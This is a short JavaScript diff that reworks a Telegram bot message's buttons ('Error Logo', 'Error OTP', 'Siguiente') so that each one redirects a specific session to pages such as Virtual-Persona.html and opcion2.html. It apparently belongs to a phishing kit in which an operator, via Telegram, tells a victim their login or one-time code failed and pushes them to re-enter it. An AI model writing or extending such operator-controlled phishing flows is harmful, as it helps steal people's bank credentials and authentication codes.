@@ -117,16 +117,26 @@ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "🔁 Error Logo", callback_data: `error_logo_${sessionId}` },
-          { text: "🔁 Error OTP", callback_data: `error_otp_${sessionId}` }
+          {
+            text: "❌ Error Logo",
+            callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' })
+          },
+          {
+            text: "🔁 Error OTP",
+            callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'opcion2.html' })
+          }
         ],
         [
-          { text: "✅ Siguiente", callback_data: `siguiente_${sessionId}` }
+          {
+            text: "✅ Siguiente",
+            callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'opcion1.html' })
+          }
         ]
       ]
     }
   })
 });
+
 
 
 
